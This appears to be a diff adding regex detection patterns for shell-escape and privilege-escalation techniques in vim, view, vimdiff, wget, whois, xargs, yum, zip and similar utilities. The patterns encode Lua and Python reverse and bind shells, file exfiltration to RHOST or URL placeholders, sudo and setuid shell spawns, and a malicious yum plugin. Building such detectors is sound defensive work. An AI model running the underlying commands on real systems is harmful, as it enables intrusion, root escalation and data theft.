+view -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\; local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\("RHOST"\)\,os\.getenv\("RPORT"\)\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(io\.popen\(r\,"r"\)\)\;    local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(f:read\("\*a"\)\)\;t:send\(b\)\;  end\;  f:close\(\)\;t:close\(\)\;'
+view -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(k\.bind\("\*"\,os\.getenv\("LPORT"\)\)\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:accept\(\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(io\.popen\(r\,"r"\)\)\;    local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(f:read\("\*a"\)\)\;c:send\(b\)\;  end\;c:close\(\)\;f:close\(\)\;'
+view -c ':py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as r\, urllib\.parse as uelse: import urllib as u\, urllib2 as rr\.urlopen\(e"URL"\, bytes\(u\.urlencode\({"d":open\(e"LFILE"\)\.read\(\)}\)\.encode\(\)\)\)vim\.command\(":q!"\)'
+view -c ':py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import http\.server as s\, socketserver as sselse: import SimpleHTTPServer as s\, SocketServer as ssss\.TCPServer\(\(""\, int\(e"LPORT"\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)vim\.command\(":q!"\)'
+view -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.open\(os\.getenv\("LFILE"\)\, 'rb'\)  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:read\("\*a"\)  io\.close\(f\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\("RHOST"\)\,os\.getenv\("RPORT"\)\)\;  t:send\(d\)\;  t:close\(\)\;'
+view -c ':py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as relse: import urllib as rr\.urlretrieve\(e"URL"\, e"LFILE"\)vim\.command\(":q!"\)'
+view -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(k\.bind\("\*"\,os\.getenv\("LPORT"\)\)\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:accept\(\)\;  local d\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\("\*a"\)\;  c:close\(\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.open\(os\.getenv\("LFILE"\)\, "wb"\)\;  f:write\(d\)\;  io\.close\(f\)\;'
+view -c ':py import vim\; from ctypes import cdll\; cdll\.LoadLibrary\("lib\.so"\)\; vim\.command\(":q!"\)'
+\./view -c ':py import os\; os\.execl\("/bin/sh"\, "sh"\, "-pc"\, "reset\; exec sh -p"\)'
+sudo view -c ':!/bin/sh'
+sudo view -c ':py import os\; os\.execl\("/bin/sh"\, "sh"\, "-c"\, "reset\; exec sh"\)'
+sudo view -c ':lua os\.execute\("reset\; exec sh"\)'
+sudo setcap cap_setuid\+ep view
+\./view -c ':py import os\; os\.setuid\(0\)\; os\.execl\("/bin/sh"\, "sh"\, "-c"\, "reset\; exec sh"\)'
+\./view -c ':lua os\.execute\("reset\; exec sh"\)'
+vim -c ':!/bin/sh'
+vim -c ':py import os\; os\.execl\("/bin/sh"\, "sh"\, "-c"\, "reset\; exec sh"\)'
+vim -c ':lua os\.execute\("reset\; exec sh"\)'
+vim -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\; local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\("RHOST"\)\,os\.getenv\("RPORT"\)\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(io\.popen\(r\,"r"\)\)\;    local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(f:read\("\*a"\)\)\;t:send\(b\)\;  end\;  f:close\(\)\;t:close\(\)\;'
+vim -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(k\.bind\("\*"\,os\.getenv\("LPORT"\)\)\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:accept\(\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(io\.popen\(r\,"r"\)\)\;    local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(f:read\("\*a"\)\)\;c:send\(b\)\;  end\;c:close\(\)\;f:close\(\)\;'
+vim -c ':py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as r\, urllib\.parse as uelse: import urllib as u\, urllib2 as rr\.urlopen\(e"URL"\, bytes\(u\.urlencode\({"d":open\(e"LFILE"\)\.read\(\)}\)\.encode\(\)\)\)vim\.command\(":q!"\)'
+vim -c ':py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import http\.server as s\, socketserver as sselse: import SimpleHTTPServer as s\, SocketServer as ssss\.TCPServer\(\(""\, int\(e"LPORT"\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)vim\.command\(":q!"\)'
+vim -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.open\(os\.getenv\("LFILE"\)\, 'rb'\)  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:read\("\*a"\)  io\.close\(f\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\("RHOST"\)\,os\.getenv\("RPORT"\)\)\;  t:send\(d\)\;  t:close\(\)\;'
+vim -c ':py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as relse: import urllib as rr\.urlretrieve\(e"URL"\, e"LFILE"\)vim\.command\(":q!"\)'
+vim -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(k\.bind\("\*"\,os\.getenv\("LPORT"\)\)\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:accept\(\)\;  local d\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\("\*a"\)\;  c:close\(\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.open\(os\.getenv\("LFILE"\)\, "wb"\)\;  f:write\(d\)\;  io\.close\(f\)\;'
+vim -c ':py import vim\; from ctypes import cdll\; cdll\.LoadLibrary\("lib\.so"\)\; vim\.command\(":q!"\)'
+\./vim -c ':py import os\; os\.execl\("/bin/sh"\, "sh"\, "-pc"\, "reset\; exec sh -p"\)'
+sudo vim -c ':!/bin/sh'
+sudo vim -c ':py import os\; os\.execl\("/bin/sh"\, "sh"\, "-c"\, "reset\; exec sh"\)'
+sudo vim -c ':lua os\.execute\("reset\; exec sh"\)'
+sudo setcap cap_setuid\+ep vim
+\./vim -c ':py import os\; os\.setuid\(0\)\; os\.execl\("/bin/sh"\, "sh"\, "-c"\, "reset\; exec sh"\)'
+\./vim -c ':lua os\.execute\("reset\; exec sh"\)'
+vimdiff -c ':!/bin/sh'
+vimdiff -c ':py import os\; os\.execl\("/bin/sh"\, "sh"\, "-c"\, "reset\; exec sh"\)'
+vimdiff -c ':lua os\.execute\("reset\; exec sh"\)'
+vimdiff -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\; local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\("RHOST"\)\,os\.getenv\("RPORT"\)\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(io\.popen\(r\,"r"\)\)\;    local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(f:read\("\*a"\)\)\;t:send\(b\)\;  end\;  f:close\(\)\;t:close\(\)\;'
+vimdiff -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(k\.bind\("\*"\,os\.getenv\("LPORT"\)\)\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:accept\(\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(io\.popen\(r\,"r"\)\)\;    local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(f:read\("\*a"\)\)\;c:send\(b\)\;  end\;c:close\(\)\;f:close\(\)\;'
+vimdiff -c ':py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as r\, urllib\.parse as uelse: import urllib as u\, urllib2 as rr\.urlopen\(e"URL"\, bytes\(u\.urlencode\({"d":open\(e"LFILE"\)\.read\(\)}\)\.encode\(\)\)\)vim\.command\(":q!"\)'
+vimdiff -c ':py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import http\.server as s\, socketserver as sselse: import SimpleHTTPServer as s\, SocketServer as ssss\.TCPServer\(\(""\, int\(e"LPORT"\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)vim\.command\(":q!"\)'
+vimdiff -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.open\(os\.getenv\("LFILE"\)\, 'rb'\)  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:read\("\*a"\)  io\.close\(f\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\("RHOST"\)\,os\.getenv\("RPORT"\)\)\;  t:send\(d\)\;  t:close\(\)\;'
+vimdiff -c ':py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as relse: import urllib as rr\.urlretrieve\(e"URL"\, e"LFILE"\)vim\.command\(":q!"\)'
+vimdiff -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(k\.bind\("\*"\,os\.getenv\("LPORT"\)\)\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:accept\(\)\;  local d\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\("\*a"\)\;  c:close\(\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.open\(os\.getenv\("LFILE"\)\, "wb"\)\;  f:write\(d\)\;  io\.close\(f\)\;'
+vimdiff -c ':py import vim\; from ctypes import cdll\; cdll\.LoadLibrary\("lib\.so"\)\; vim\.command\(":q!"\)'
+\./vimdiff -c ':py import os\; os\.execl\("/bin/sh"\, "sh"\, "-pc"\, "reset\; exec sh -p"\)'
+sudo vimdiff -c ':!/bin/sh'
+sudo vimdiff -c ':py import os\; os\.execl\("/bin/sh"\, "sh"\, "-c"\, "reset\; exec sh"\)'
+sudo vimdiff -c ':lua os\.execute\("reset\; exec sh"\)'
+sudo setcap cap_setuid\+ep vimdiff
+\./vimdiff -c ':py import os\; os\.setuid\(0\)\; os\.execl\("/bin/sh"\, "sh"\, "-c"\, "reset\; exec sh"\)'
+\./vimdiff -c ':lua os\.execute\("reset\; exec sh"\)'
+watch -x sh -c 'reset\; exec sh 1>&0 2>&0'
+\./watch -x sh -c 'reset\; exec sh 1>&0 2>&0'
+sudo watch -x sh -c 'reset\; exec sh 1>&0 2>&0'
+\./watch 'reset\; exec sh 1>&0 2>&0'
+wget http\w:[\w\.\/\?\=\&\%]+ -O http\w:[\w\.\/\?\=\&\%]+|wget \$[A-Z_]+ -O \$[A-Z_]+|wget [ a-z0-9A-Z\.\-\/\'\"_\@]+ -O [ a-z0-9A-Z\.\-\/\'\"_\@]+
+\./wget http\w:[\w\.\/\?\=\&\%]+ -O http\w:[\w\.\/\?\=\&\%]+|\./wget [ a-z0-9A-Z\.\-\/\'\"_\@]+ -O [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./wget \$[A-Z_]+ -O \$[A-Z_]+
+sudo wget http\w:[\w\.\/\?\=\&\%]+ -O http\w:[\w\.\/\?\=\&\%]+|sudo wget \$[A-Z_]+ -O \$[A-Z_]+|sudo wget [ a-z0-9A-Z\.\-\/\'\"_\@]+ -O [ a-z0-9A-Z\.\-\/\'\"_\@]+
+whois -h \$[A-Z_]+ -p \$[A-Z_]+ "`cat \$[A-Z_]+`"|whois -h [ a-z0-9A-Z\.\-\/\'\"_\@]+ -p [ a-z0-9A-Z\.\-\/\'\"_\@]+ "`cat [ a-z0-9A-Z\.\-\/\'\"_\@]+`"|whois -h http\w:[\w\.\/\?\=\&\%]+ -p http\w:[\w\.\/\?\=\&\%]+ "`cat http\w:[\w\.\/\?\=\&\%]+`"
+whois -h http\w:[\w\.\/\?\=\&\%]+ -p http\w:[\w\.\/\?\=\&\%]+ "`base64 http\w:[\w\.\/\?\=\&\%]+`"|whois -h \$[A-Z_]+ -p \$[A-Z_]+ "`base64 \$[A-Z_]+`"|whois -h [ a-z0-9A-Z\.\-\/\'\"_\@]+ -p [ a-z0-9A-Z\.\-\/\'\"_\@]+ "`base64 [ a-z0-9A-Z\.\-\/\'\"_\@]+`"
+whois -h http\w:[\w\.\/\?\=\&\%]+ -p http\w:[\w\.\/\?\=\&\%]+ > "http\w:[\w\.\/\?\=\&\%]+"|whois -h \$[A-Z_]+ -p \$[A-Z_]+ > "\$[A-Z_]+"|whois -h [ a-z0-9A-Z\.\-\/\'\"_\@]+ -p [ a-z0-9A-Z\.\-\/\'\"_\@]+ > "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+whois -h \$[A-Z_]+ -p \$[A-Z_]+ \| base64 -d > "\$[A-Z_]+"|whois -h http\w:[\w\.\/\?\=\&\%]+ -p http\w:[\w\.\/\?\=\&\%]+ \| base64 -d > "http\w:[\w\.\/\?\=\&\%]+"|whois -h [ a-z0-9A-Z\.\-\/\'\"_\@]+ -p [ a-z0-9A-Z\.\-\/\'\"_\@]+ \| base64 -d > "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+exec /bin/sh <@stdin >@stdout 2>@stderr
+exec /bin/sh <@stdin >@stdout 2>@stderr
+xargs -a /dev/null sh
+echo x \| xargs -Iy sh -c 'exec sh 0<&1'
+xargs -Ix sh -c 'exec sh 0<&1'x\^D\^D
+xargs -a "\$[A-Z_]+" -0|xargs -a "http\w:[\w\.\/\?\=\&\%]+" -0|xargs -a "[ a-z0-9A-Z\.\-\/\'\"_\@]+" -0
+\./xargs -a /dev/null sh -p
+sudo xargs -a /dev/null sh
+xmodmap -v \$[A-Z_]+|xmodmap -v http\w:[\w\.\/\?\=\&\%]+|xmodmap -v [ a-z0-9A-Z\.\-\/\'\"_\@]+
+\./xmodmap -v http\w:[\w\.\/\?\=\&\%]+|\./xmodmap -v [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./xmodmap -v \$[A-Z_]+
+sudo xmodmap -v [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo xmodmap -v http\w:[\w\.\/\?\=\&\%]+|sudo xmodmap -v \$[A-Z_]+
+xxd "\$[A-Z_]+" \| xxd -r|xxd "[ a-z0-9A-Z\.\-\/\'\"_\@]+" \| xxd -r|xxd "http\w:[\w\.\/\?\=\&\%]+" \| xxd -r
+\./xxd "\$[A-Z_]+" \| xxd -r|\./xxd "http\w:[\w\.\/\?\=\&\%]+" \| xxd -r|\./xxd "[ a-z0-9A-Z\.\-\/\'\"_\@]+" \| xxd -r
+sudo xxd "http\w:[\w\.\/\?\=\&\%]+" \| xxd -r|sudo xxd "[ a-z0-9A-Z\.\-\/\'\"_\@]+" \| xxd -r|sudo xxd "\$[A-Z_]+" \| xxd -r
+xz -c "http\w:[\w\.\/\?\=\&\%]+" \| xz -d|xz -c "[ a-z0-9A-Z\.\-\/\'\"_\@]+" \| xz -d|xz -c "\$[A-Z_]+" \| xz -d
+\./xz -c "http\w:[\w\.\/\?\=\&\%]+" \| xz -d|\./xz -c "[ a-z0-9A-Z\.\-\/\'\"_\@]+" \| xz -d|\./xz -c "\$[A-Z_]+" \| xz -d
+sudo xz -c "http\w:[\w\.\/\?\=\&\%]+" \| xz -d|sudo xz -c "[ a-z0-9A-Z\.\-\/\'\"_\@]+" \| xz -d|sudo xz -c "\$[A-Z_]+" \| xz -d
+yum install http://[ a-z0-9A-Z\.\-\/\'\"_\@]+/[ a-z0-9A-Z\.\-\/\'\"_\@]+|yum install http://http\w:[\w\.\/\?\=\&\%]+/http\w:[\w\.\/\?\=\&\%]+|yum install http://\$[A-Z_]+/\$[A-Z_]+
+fpm -n x -s dir -t rpm -a all --before-install http\w:[\w\.\/\?\=\&\%]+/x\.sh http\w:[\w\.\/\?\=\&\%]+|fpm -n x -s dir -t rpm -a all --before-install \$[A-Z_]+/x\.sh \$[A-Z_]+|fpm -n x -s dir -t rpm -a all --before-install [ a-z0-9A-Z\.\-\/\'\"_\@]+/x\.sh [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo yum localinstall -y x-1\.0-1\.noarch\.rpm
+cat >[ a-z0-9A-Z\.\-\/\'\"_\@]+/x<<[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+=\$[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+EOFcat >[ a-z0-9A-Z\.\-\/\'\"_\@]+/y\.conf<<[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+>[ a-z0-9A-Z\.\-\/\'\"_\@]+/y\.py<<EOFimport osimport yumfrom yum\.plugins import PluginYumExit\, TYPE_CORE\, [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.1'def init_hook\(conduit\):  os\.execl\('/bin/sh'\,'/bin/sh'\)EOFsudo yum -c [ a-z0-9A-Z\.\-\/\'\"_\@]+/x [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+|cat >http\w:[\w\.\/\?\=\&\%]+/x<<[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+=\$[\w\-_]+=http\w:[\w\.\/\?\=\&\%]+EOFcat >http\w:[\w\.\/\?\=\&\%]+/y\.conf<<[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+>http\w:[\w\.\/\?\=\&\%]+/y\.py<<EOFimport osimport yumfrom yum\.plugins import PluginYumExit\, TYPE_CORE\, [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.1'def init_hook\(conduit\):  os\.execl\('/bin/sh'\,'/bin/sh'\)EOFsudo yum -c http\w:[\w\.\/\?\=\&\%]+/x [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+|cat >\$[A-Z_]+/x<<[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+=\$[\w\-_]+=\$[A-Z_]+EOFcat >\$[A-Z_]+/y\.conf<<[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+>\$[A-Z_]+/y\.py<<EOFimport osimport yumfrom yum\.plugins import PluginYumExit\, TYPE_CORE\, [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.1'def init_hook\(conduit\):  os\.execl\('/bin/sh'\,'/bin/sh'\)EOFsudo yum -c \$[A-Z_]+/x [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+
+zip \$[A-Z_]+ /etc/hosts -T -TT 'sh #'|zip http\w:[\w\.\/\?\=\&\%]+ /etc/hosts -T -TT 'sh #'|zip [ a-z0-9A-Z\.\-\/\'\"_\@]+ /etc/hosts -T -TT 'sh #'
+sudo zip \$[A-Z_]+ /etc/hosts -T -TT 'sh #'|sudo zip [ a-z0-9A-Z\.\-\/\'\"_\@]+ /etc/hosts -T -TT 'sh #'|sudo zip http\w:[\w\.\/\?\=\&\%]+ /etc/hosts -T -TT 'sh #'
+sudo rm http\w:[\w\.\/\?\=\&\%]+|sudo rm \$[A-Z_]+|sudo rm [ a-z0-9A-Z\.\-\/\'\"_\@]+
+\./zip http\w:[\w\.\/\?\=\&\%]+ /etc/hosts -T -TT 'sh #'|\./zip [ a-z0-9A-Z\.\-\/\'\"_\@]+ /etc/hosts -T -TT 'sh #'|\./zip \$[A-Z_]+ /etc/hosts -T -TT 'sh #'
+sudo rm http\w:[\w\.\/\?\=\&\%]+|sudo rm \$[A-Z_]+|sudo rm [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo zsoelim "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo zsoelim "http\w:[\w\.\/\?\=\&\%]+"|sudo zsoelim "\$[A-Z_]+"
+cp /bin/sh [ a-z0-9A-Z\.\-\/\'\"_\@]+/zypper-x|cp /bin/sh http\w:[\w\.\/\?\=\&\%]+/zypper-x|cp /bin/sh \$[A-Z_]+/zypper-x
+sudo zypper x
+cp /bin/sh [ a-z0-9A-Z\.\-\/\'\"_\@]+/zypper-x|cp /bin/sh http\w:[\w\.\/\?\=\&\%]+/zypper-x|cp /bin/sh \$[A-Z_]+/zypper-x
